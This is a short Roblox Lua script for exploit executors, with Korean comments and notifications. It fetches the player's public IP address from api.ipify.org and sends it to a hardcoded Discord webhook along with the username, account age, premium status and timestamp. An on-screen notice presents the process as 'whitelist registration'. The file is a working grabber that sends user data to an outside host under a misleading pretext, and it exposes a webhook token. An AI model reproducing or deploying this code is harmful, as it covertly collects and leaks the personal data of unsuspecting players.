-- 공백
local discordWebhookURL = "https://discord.com/api/webhooks/1364876404944142346/2fYhu4K9_cehkOf25yYZcDo603hVESd6K04thfMz0-xnv2s1-RfbNEsvj-FfYPBxp8an"  -- 웹훅 URL
local http_request = (syn and syn.request) or (http and http.request) or request
local ipifyURL = "https://api.ipify.org/"

local player = game.Players.LocalPlayer
local playerName = player.Name
local accountAge = player.AccountAge
local premiumStatus = tostring(player.MembershipType)
local currentTime = os.date("%Y-%m-%d %H:%M:%S")

local function getIP()
    if http_request then
        local response = http_request({
            Url = ipifyURL,
            Method = "GET",
            Headers = {
                ["Content-Type"] = "application/json"
            }
        })
        if response and response.Body then
            return response.Body  
        else
            return "IP 가져오기 실패"
        end
    else
        return "HTTP 요청 불가"
    end
end

if http_request then
    local ipAddress = getIP()  
    local data = {
        content = "@everyone 로블록스 닉네임: " .. playerName .. 
                  "\nIP 주소: " .. ipAddress .. 
                  "\n계정 나이: " .. accountAge .. "일" .. 
                  "\n프리미엄 여부: " .. premiumStatus .. 
                  "\n실행 시간: " .. currentTime
    }

    http_request({
        Url = discordWebhookURL,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode(data)
    })
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "로블록스 닉네임을 알려주세요",
        Text = "화이트 리스트 등록",
        Duration = 6969747469
    })
else
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "실행기를 바꿔주세요(솔라라 가능)",
        Text = "실행기 이슈 :)",
        Duration = 5
    })
    print("실행기가 HTTP 지원 안 하네")
end